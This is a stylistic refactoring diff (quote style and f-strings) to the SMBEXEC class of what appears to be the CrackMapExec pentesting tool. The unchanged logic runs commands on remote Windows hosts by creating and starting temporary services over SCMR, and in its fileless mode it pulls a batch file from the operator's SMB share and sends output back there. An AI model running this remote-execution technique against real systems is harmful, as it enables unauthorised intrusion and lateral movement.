@@ -86,31 +86,31 @@ class SMBEXEC:
 
     def execute_remote(self, data):
         self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + '.bat'
+        self.__batchFile = gen_random_string(6) + ".bat"
 
         if self.__retOutput:
-            command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+            command = self.__shell + "echo " + data + f" ^> \\\\127.0.0.1\\{self.__share_name}\\{self.__output} 2^>^&1 > %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\{self.__batchFile}"
         else:
             command = self.__shell + data
 
-        with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
+        with open(os.path.join("/tmp", "cme_hosted", self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
-        self.logger.debug('Hosting batch file with command: ' + command)
+        self.logger.debug("Hosting batch file with command: " + command)
 
         #command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
-        self.logger.debug('Command to execute: ' + command)
+        self.logger.debug("Command to execute: " + command)
 
-        self.logger.debug('Remote service {} created.'.format(self.__serviceName))
+        self.logger.debug(f"Remote service {self.__serviceName} created.")
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
-        service = resp['lpServiceHandle']
+        service = resp["lpServiceHandle"]
 
         try:
-            self.logger.debug('Remote service {} started.'.format(self.__serviceName))
+            self.logger.debug(f"Remote service {self.__serviceName} started.")
             scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        self.logger.debug('Remote service {} deleted.'.format(self.__serviceName))
+        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_remote()       
@@ -125,7 +125,7 @@ class SMBEXEC:
                 break
             except Exception as e:
                 print(e)
-                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
+                if str(e).find("STATUS_SHARING_VIOLATION") >=0:
                     # Output not finished, let's wait
                     sleep(2)
                     pass
@@ -137,42 +137,43 @@ class SMBEXEC:
 
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + '.bat'
+        self.__batchFile = gen_random_string(6) + ".bat"
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         if self.__retOutput:
-            command = self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
+            command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}"
         else:
             command = self.__shell + data
 
-        with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
+        with open(os.path.join("/tmp", "cme_hosted", self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
-        self.logger.debug('Hosting batch file with command: ' + command)
+        self.logger.debug("Hosting batch file with command: " + command)
 
-        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
-        self.logger.debug('Command to execute: ' + command)
+        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
+        self.logger.debug("Command to execute: " + command)
 
-        self.logger.debug('Remote service {} created.'.format(self.__serviceName))
+        self.logger.debug(f"Remote service {self.__serviceName} created.")
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
-        service = resp['lpServiceHandle']
+        service = resp["lpServiceHandle"]
 
         try:
-            self.logger.debug('Remote service {} started.'.format(self.__serviceName))
+            self.logger.debug(f"Remote service {self.__serviceName} started.")
             scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        self.logger.debug('Remote service {} deleted.'.format(self.__serviceName))
+        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
 
     def get_output_fileless(self):
-        if not self.__retOutput: return
+        if not self.__retOutput:
+            return
 
         while True:
             try:
-                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'rb') as output:
+                with open(os.path.join("/tmp", "cme_hosted", self.__output), "rb") as output:
                     self.output_callback(output.read())
                 break
             except IOError:
@@ -185,9 +186,9 @@ class SMBEXEC:
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
-           self.__scHandle = resp['lpScHandle']
+           self.__scHandle = resp["lpScHandle"]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
-           service = resp['lpServiceHandle']
+           service = resp["lpServiceHandle"]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
